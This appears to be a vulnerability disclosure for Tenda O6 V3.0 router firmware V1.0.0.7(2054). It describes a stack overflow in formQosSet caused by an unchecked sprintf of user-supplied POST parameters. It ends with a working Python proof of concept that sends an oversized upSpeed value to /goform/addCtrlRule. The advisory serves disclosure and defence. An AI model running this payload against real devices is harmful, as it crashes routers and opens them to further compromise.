## Overview
- Firmware download website: [https://www.tenda.com.cn/download/detail-3861.html](https://www.tenda.com.cn/download/detail-3861.html)
## Affected version
  O6 V3.0 V1.0.0.7(2054)
## Vulnerability details
In the O6 V3.0 firmware version V1.0.0.7(2054), there is a stack overflow vulnerability in the `formQosSet` function. Specifically, the variables `Var`, `v3`, `v4`, `v5`, and `v6` receive their values from user-controlled POST request parameters, namely `remark`, `ipRange`, `upSpeed`, `downSpeed`, and `enable`. The function contains a call to `sprintf` that formats these variables into the `v18` buffer as follows:
`sprintf(v18, "%d;%s;%s;%s;%s;0;0;0;1;%s", v8 + 1, v6, v3, v4, v5, Var);`
Since the length of the `remark`, `ipRange`, `upSpeed`, `downSpeed`, and `enable` parameters is not validated, it is possible for these user-provided values to exceed the capacity of the `v18` array. This can lead to a buffer overflow, which is a significant security vulnerability.
![[Pasted image 20240805173254.png]]

## POC
```python
import requests
ip = "192.168.109.145"
url = "http://" + ip + "/goform/addCtrlRule"
payload = b"ab"*3000

data = {"upSpeed": payload}
response = requests.post(url, data=data)
print(response.text)
```
![[Pasted image 20240805163853.png]]
